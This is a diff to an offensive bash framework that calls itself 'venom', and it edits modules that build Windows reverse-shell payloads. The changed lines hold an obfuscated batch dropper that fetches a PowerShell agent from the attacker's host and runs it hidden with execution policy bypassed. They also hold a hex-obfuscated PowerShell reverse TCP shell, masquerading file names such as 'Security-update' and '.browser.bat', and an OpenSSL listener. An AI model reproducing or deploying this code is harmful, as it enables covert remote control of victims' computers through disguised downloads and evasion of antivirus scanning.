@@ -29,6 +29,20 @@ if [ $(id -u) != "0" ]; then
 fi
 
 
+
+# ------------------------------
+# Make sure ZENITY its installed
+# ------------------------------
+zen=$(which zenity)
+if ! [ "$?" -eq "0" ]; then
+   echo "[x] zenity............................[ NOT found ]";sleep 12
+   echo "[i] Please Wait, installing dependencie...";sleep 2
+   sudo apt-get install zenity
+   sleep 2;clear
+fi
+
+
+
 # -----------------------------------
 # Colorise shell Script output leters
 # -----------------------------------
@@ -11409,7 +11423,7 @@ sh_icmp_shell () {
 echo "[☠] Enter module settings!"
 lhost=$(zenity --title="☠ Enter LHOST (local ip) ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 target=$(zenity --title="☠ Enter RHOST (target ip) ☠" --text "example: 192.168.1.72" --entry --width 300) > /dev/null 2>&1
-N4m=$(zenity --title="☠ Enter Dropper FileName ☠" --text "example: dropper" --entry --width 300) > /dev/null 2>&1
+N4m=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Dropper\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
 
 
@@ -11934,24 +11948,24 @@ cat << !
     | DESCRIPTION        : Reverse TCP Powershell Shell
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : WinHttpRequest
-    | AGENT EXTENSION    : PS1
-    |_DROPPER EXTENSION  : PS1
+    | DROPPER EXTENSION  : PS1
+    |_AGENT EXTENSION    : PS1
 
     AGENT Nº2
     ╔──────────────────────────────────────────────────────────────
     | DESCRIPTION        : Reverse OpenSSL Powershell Shell
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : Powershell (DownloadFile)
-    | AGENT EXTENSION    : PS1
-    |_DROPPER EXTENSION  : BAT
+    | DROPPER EXTENSION  : BAT
+    |_AGENT EXTENSION    : PS1
 
     AGENT Nº3
     ╔──────────────────────────────────────────────────────────────
     | DESCRIPTION        : Reverse Powershell Shell (hex obfuscation)
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : Powershell (DownloadFile)
-    | AGENT EXTENSION    : PS1
-    |_DROPPER EXTENSION  : BAT
+    | DROPPER EXTENSION  : BROWSER.BAT (MITRE T1036)
+    |_AGENT EXTENSION    : PS1
 
     ╔─────────────────────────────────────────────────────────────╗
     ║   M    - Return to main menu                                ║
@@ -11995,15 +12009,15 @@ sleep 2
 
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: update-72.1.3\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
-NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: security-update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-72.1.3\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
-if [ -z "$Drop" ]; then Drop="update-72.1.3";fi
-if [ -z "$NaM" ]; then NaM="security-update";fi
+if [ -z "$Drop" ]; then Drop="Update-72.1.3";fi
+if [ -z "$NaM" ]; then NaM="Security-update";fi
 
 # display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
@@ -12011,7 +12025,7 @@ echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
-    UPLOAD   : FileLess (ram)
+    UPLOAD   : Fileless (ram)
     LOLBin   : WinHttpRequest
     DROPPER  : $IPATH/output/$Drop.ps1
     AGENT    : $IPATH/output/$NaM.ps1
@@ -12141,8 +12155,8 @@ sleep 2
 
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: update-72.1.3\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
-NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: security-update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-72.1.3\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com" --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
 
@@ -12150,9 +12164,9 @@ rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
-if [ -z "$NaM" ]; then NaM="security-update";fi
+if [ -z "$NaM" ]; then NaM="Security-update";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
-if [ -z "$Drop" ]; then Drop="update-72.1.3";fi
+if [ -z "$Drop" ]; then Drop="Update-72.1.3";fi
 if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
 
 
@@ -12166,7 +12180,7 @@ cat << !
     LOLBin   : Powershell (DownloadFile)
     DROPPER  : $IPATH/output/$Drop.bat
     AGENT    : $IPATH/output/$NaM.ps1
-    UPLOAD   : $rpath\\\\$NaM.ps1
+    UPLOADTO : $rpath\\\\$NaM.ps1
 !
 echo "---"
 
@@ -12217,7 +12231,7 @@ echo "}" >> $IPATH/output/$NaM.ps1
 cd $IPATH/output
 echo "${BlueF}[☠]${white} Building SSL certificate (openssl) .."${Reset};sleep 2
 xterm -T " Building SSL certificate " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj \"/C=US/ST=Texas/L=Albany/O=Global Security/OU=IT Department/CN=$CN\""
-echo "${BlueF}[☠]${white} venom-main/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 1
+echo "${BlueF}[☠]${white} venom-main/output/key.pem + cert.pem ([${GreenF}OK${white}])${white} ..";sleep 2
 cd $IPATH
 
 
@@ -12247,7 +12261,6 @@ cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
 cd $IPATH
 
 
-
 ## Print attack vector on terminal
 echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
 echo "${BlueF}---"
@@ -12263,7 +12276,7 @@ read odf
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START HANDLER
 cd $IPATH/output
-xterm -T " OPENSSL LISTENER - $lhost:$lport" -geometry 110x23 -e "openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
+xterm -T " OPENSSL LISTENER - $lhost:$lport" -geometry 110x23 -e "echo [+] Domain: $CN - Waiting for inbound connection ..;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
 cd $IPATH
 sleep 2
 
@@ -12303,16 +12316,16 @@ sleep 2
 
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: security-update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: update-72.1.3\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-72.1.3\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
-if [ -z "$Drop" ]; then Drop="update-72.1.3";fi
+if [ -z "$Drop" ]; then Drop="Update-72.1.3";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
-if [ -z "$NaM" ]; then NaM="security-update";fi
+if [ -z "$NaM" ]; then NaM="Security-update";fi
 
 # display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
@@ -12321,9 +12334,9 @@ cat << !
     LPORT    : $lport
     LHOST    : $lhost
     LOLBin   : Powershell (DownloadFile)
-    DROPPER  : $IPATH/output/$Drop.bat
+    DROPPER  : $IPATH/output/$Drop.browser.bat
     AGENT    : $IPATH/output/$NaM.ps1
-    UPLOAD   : $rpath\\\\$NaM.ps1
+    UPLOADTO : $rpath\\\\$NaM.ps1
 !
 echo "---"
 
@@ -12331,10 +12344,10 @@ echo "---"
 ## BUILD DROPPER
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- OLD DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
-echo "@echo off" > $IPATH/output/$Drop.bat
-echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.bat
-echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
-echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
+echo "@echo off" > $IPATH/output/$Drop.browser.bat
+echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.browser.bat
+echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.browser.bat
+echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.browser.bat
 
 
 ## Convert attacker ip address to hex
@@ -12360,7 +12373,7 @@ echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
 echo "Original shell: Paranoid Ninja" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
-echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';\$w = \"GET /index.html HTTP/1.1\`r\`nHost: \$p\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";\$s = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};\$x = \"n-eiorvsxpk5\";Set-alias \$x (\$x[\$true-10] + (\$x[[byte](\"0x\" + \"FF\") - 265]) + \$x[[byte](\"0x\" + \"9a\") - 158]);\$y = New-Object System.Net.Sockets.TCPClient(\$p,$lport);\$z = \$y.GetStream();\$d = \$s::UTF8.GetBytes(\$w);\$z.Write(\$d, 0, \$d.Length);\$t = (n-eiorvsxpk5 whoami) + \"> \";while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;\$v = (New-Object -TypeName \$s).GetString(\$b,0, \$l);\$d = \$s::UTF8.GetBytes((n-eiorvsxpk5 \$v 2>&1 | Out-String )) + \$s::UTF8.GetBytes(\$t);\$z.Write(\$d, 0, \$d.Length);}\$y.Close();Start-Sleep -Seconds 4}" >> $IPATH/output/$NaM.ps1
+echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';\$w = \"GET /index.html HTTP/1.1\`r\`nHost: \$p\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";\$s = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};\$x = \"n-eiorvsxpk5\";Set-alias \$x (\$x[\$true-10] + (\$x[[byte](\"0x\" + \"FF\") - 265]) + \$x[[byte](\"0x\" + \"9a\") - 158]);\$y = New-Object System.Net.Sockets.TCPClient(\$p,$lport);\$z = \$y.GetStream();\$d = \$s::UTF8.GetBytes(\$w);\$z.Write(\$d, 0, \$d.Length);\$t = (n-eiorvsxpk5 whoami) + \"> \";while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;\$v = (New-Object -TypeName \$s).GetString(\$b,0, \$l);\$d = \$s::UTF8.GetBytes((n-eiorvsxpk5 \$v 2>&1 | Out-String )) + \$s::UTF8.GetBytes(\$t);\$z.Write(\$d, 0, \$d.Length);}\$y.Close();Start-Sleep -Seconds 3}" >> $IPATH/output/$NaM.ps1
 
 
 ## Building Download webpage
@@ -12381,7 +12394,7 @@ cd $IPATH
 
 ## Copy files to apache2 webroot
 cd $IPATH/output
-zip $Drop.zip $Drop.bat > /dev/nul 2>&1
+zip $Drop.zip $Drop.browser.bat > /dev/nul 2>&1
 #zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1 # <-- OLD DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
